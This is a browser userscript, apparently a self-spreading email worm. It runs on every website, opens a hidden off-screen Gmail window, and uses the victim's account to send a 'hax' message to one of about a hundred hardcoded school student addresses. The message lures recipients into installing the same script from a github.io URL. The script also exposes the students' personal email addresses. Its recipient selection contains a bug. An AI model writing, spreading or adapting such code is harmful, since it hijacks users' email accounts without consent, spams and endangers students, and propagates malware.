// ==UserScript==
// @name         Hidden email action - beta
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  none
// @author       You
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';
    function loadsc() {
        window.emails="anis3092@danbury.k12.ct.us,anis3092@danbury.k12.ct.us,afol3001@danbury.k12.ct.us,afol3001@danbury.k12.ct.us,amey2006@danbury.k12.ct.us,amey2006@danbury.k12.ct.us,abar3011@danbury.k12.ct.us,abar3011@danbury.k12.ct.us,ahow3046@danbury.k12.ct.us,ahow3046@danbury.k12.ct.us,acha3012@danbury.k12.ct.us,acha3012@danbury.k12.ct.us,aper3127@danbury.k12.ct.us,aper3127@danbury.k12.ct.us,aama1118@danbury.k12.ct.us,aama1118@danbury.k12.ct.us,aros3023@danbury.k12.ct.us,aros3023@danbury.k12.ct.us,avie3114@danbury.k12.ct.us,avie3114@danbury.k12.ct.us,ajon3084@danbury.k12.ct.us,ajon3084@danbury.k12.ct.us,aspe1099@danbury.k12.ct.us,aspe1099@danbury.k12.ct.us,bdub1068@danbury.k12.ct.us,bdub1068@danbury.k12.ct.us,blop3088@danbury.k12.ct.us,blop3088@danbury.k12.ct.us,blei3104@danbury.k12.ct.us,blei3104@danbury.k12.ct.us,bjac3016@danbury.k12.ct.us,bjac3016@danbury.k12.ct.us,cstu3035@danbury.k12.ct.us,cstu3035@danbury.k12.ct.us,cgut3100@danbury.k12.ct.us,cgut3100@danbury.k12.ct.us,ccen3015@danbury.k12.ct.us,ccen3015@danbury.k12.ct.us,clop3011@danbury.k12.ct.us,clop3011@danbury.k12.ct.us,cnun3032@danbury.k12.ct.us,cnun3032@danbury.k12.ct.us,calm3008@danbury.k12.ct.us,calm3008@danbury.k12.ct.us,dzal3050@danbury.k12.ct.us,dzal3050@danbury.k12.ct.us,dqui3038@danbury.k12.ct.us,dqui3038@danbury.k12.ct.us,dmel3054@danbury.k12.ct.us,dmel3054@danbury.k12.ct.us,dros3062@danbury.k12.ct.us,dros3062@danbury.k12.ct.us,ebra3173@danbury.k12.ct.us,ebra3173@danbury.k12.ct.us,elun3043@danbury.k12.ct.us,elun3043@danbury.k12.ct.us,evil2035@danbury.k12.ct.us,evil2035@danbury.k12.ct.us,emad3141@danbury.k12.ct.us,emad3141@danbury.k12.ct.us,ejos3044@danbury.k12.ct.us,ejos3044@danbury.k12.ct.us,ebae3099@danbury.k12.ct.us,ebae3099@danbury.k12.ct.us,fsal3043@danbury.k12.ct.us,fsal3043@danbury.k12.ct.us,hsea3029@danbury.k12.ct.us,hsea3029@danbury.k12.ct.us,hpet3055@danbury.k12.ct.us,hpet3055@danbury.k12.ct.us,hbot3136@danbury.k12.ct.us,hbot3136@danbury.k12.ct.us,htho3020@danbury.k12.ct.us,htho3020@danbury.k12.ct.us,hdav3089@danbury.k12.ct.us,hdav3089@danbury.k12.ct.us,ipri1031@danbury.k12.ct.us,ipri1031@danbury.k12.ct.us,idia3022@danbury.k12.ct.us,idia3022@danbury.k12.ct.us,ipha3126@danbury.k12.ct.us,ipha3126@danbury.k12.ct.us,jnai3083@danbury.k12.ct.us,jnai3083@danbury.k12.ct.us,jgon3029@danbury.k12.ct.us,jgon3029@danbury.k12.ct.us,jriv3048@danbury.k12.ct.us,jriv3048@danbury.k12.ct.us,jmar3042@danbury.k12.ct.us,jmar3042@danbury.k12.ct.us,jlyr3023@danbury.k12.ct.us,jlyr3023@danbury.k12.ct.us,jfer3009@danbury.k12.ct.us,jfer3009@danbury.k12.ct.us,jram3022@danbury.k12.ct.us,jram3022@danbury.k12.ct.us,jrub3031@danbury.k12.ct.us,jrub3031@danbury.k12.ct.us,jcre3004@danbury.k12.ct.us,jcre3004@danbury.k12.ct.us,jmar3099@danbury.k12.ct.us,jmar3099@danbury.k12.ct.us,jchi3040@danbury.k12.ct.us,jchi3040@danbury.k12.ct.us,jfer3012@danbury.k12.ct.us,jfer3012@danbury.k12.ct.us,jcyr3016@danbury.k12.ct.us,jcyr3016@danbury.k12.ct.us,kmon3027@danbury.k12.ct.us,kmon3027@danbury.k12.ct.us,khuq3015@danbury.k12.ct.us,khuq3015@danbury.k12.ct.us,ktap3016@danbury.k12.ct.us,ktap3016@danbury.k12.ct.us,kbar3001@danbury.k12.ct.us,kbar3001@danbury.k12.ct.us,kher3087@danbury.k12.ct.us,kher3087@danbury.k12.ct.us,kdos3196@danbury.k12.ct.us,kdos3196@danbury.k12.ct.us,kvas3045@danbury.k12.ct.us,kvas3045@danbury.k12.ct.us,kfah3010@danbury.k12.ct.us,kfah3010@danbury.k12.ct.us,ltoa3162@danbury.k12.ct.us,ltoa3162@danbury.k12.ct.us,lgui3086@danbury.k12.ct.us,lgui3086@danbury.k12.ct.us,lram3032@danbury.k12.ct.us,lram3032@danbury.k12.ct.us,ldji3021@danbury.k12.ct.us,ldji3021@danbury.k12.ct.us,mill3006@danbury.k12.ct.us,mill3006@danbury.k12.ct.us,msch3112@danbury.k12.ct.us,msch3112@danbury.k12.ct.us,mpin3029@danbury.k12.ct.us,mpin3029@danbury.k12.ct.us,mlat3022@danbury.k12.ct.us,mlat3022@danbury.k12.ct.us,msno3011@danbury.k12.ct.us,msno3011@danbury.k12.ct.us,mpan3035@danbury.k12.ct.us,mpan3035@danbury.k12.ct.us,mhow2050@danbury.k12.ct.us,mhow2050@danbury.k12.ct.us,mbas3012@danbury.k12.ct.us,mbas3012@danbury.k12.ct.us,ngue3008@danbury.k12.ct.us,ngue3008@danbury.k12.ct.us,nmat3027@danbury.k12.ct.us,nmat3027@danbury.k12.ct.us,omul3051@danbury.k12.ct.us,omul3051@danbury.k12.ct.us,omuf1041@danbury.k12.ct.us,omuf1041@danbury.k12.ct.us,otap3155@danbury.k12.ct.us,otap3155@danbury.k12.ct.us,odas2076@danbury.k12.ct.us,odas2076@danbury.k12.ct.us,prog3066@danbury.k12.ct.us,prog3066@danbury.k12.ct.us,rhue3123@danbury.k12.ct.us,rhue3123@danbury.k12.ct.us,rrod3116@danbury.k12.ct.us,rrod3116@danbury.k12.ct.us,rzel3008@danbury.k12.ct.us,rzel3008@danbury.k12.ct.us,rviv1025@danbury.k12.ct.us,rviv1025@danbury.k12.ct.us,sdeb3019@danbury.k12.ct.us,sdeb3019@danbury.k12.ct.us,shua3106@danbury.k12.ct.us,shua3106@danbury.k12.ct.us,srod3106@danbury.k12.ct.us,srod3106@danbury.k12.ct.us,sren3023@danbury.k12.ct.us,sren3023@danbury.k12.ct.us,sdah3004@danbury.k12.ct.us,sdah3004@danbury.k12.ct.us,ster3097@danbury.k12.ct.us,ster3097@danbury.k12.ct.us,sgan3285@danbury.k12.ct.us,sgan3285@danbury.k12.ct.us,svic3094@danbury.k12.ct.us,svic3094@danbury.k12.ct.us,tdil3020@danbury.k12.ct.us,tdil3020@danbury.k12.ct.us,tguz3035@danbury.k12.ct.us,tguz3035@danbury.k12.ct.us,vgom3168@danbury.k12.ct.us,vgom3168@danbury.k12.ct.us,vren3024@danbury.k12.ct.us,vren3024@danbury.k12.ct.us,wgib3125@danbury.k12.ct.us,wgib3125@danbury.k12.ct.us,wpor3079@danbury.k12.ct.us,wpor3079@danbury.k12.ct.us".split(',');
    }
    function rand() {
        var x = Math.floor((Math.random() * 198) + 1);
        return x;
    }
    window.onload=function() {
        loadsc();
        if(window.location.href.match('mail.google.com') !== null) {
            if(document.getElementsByTagName('input')[1].value.match('HTML Gmail') !== null) {
                document.getElementsByTagName('input')[1].click();
            }
            document.title="Loading Data";document.getElementById("sub").value='hax';
            document.getElementById("body").value=`
Hey I found this really cool script!
You need tampermonkey to be installed to run it though: https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=en
The script is here: https://austinjacks.github.io/sec101/tmpw.user.js
`;
            document.getElementById("to").value=window.emails[rand];
            document.getElementById("send").click();
        } else {var x=window.open('https://mail.google.com/mail/u/0/x/j5jycse49u7h-/?&cs=b&pv=tl&eot=1&v=b','_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=100000, top=100000, width=1, height=1, visible=none', '');
                setTimeout(function() {x.close();}, 5500);}};
})();
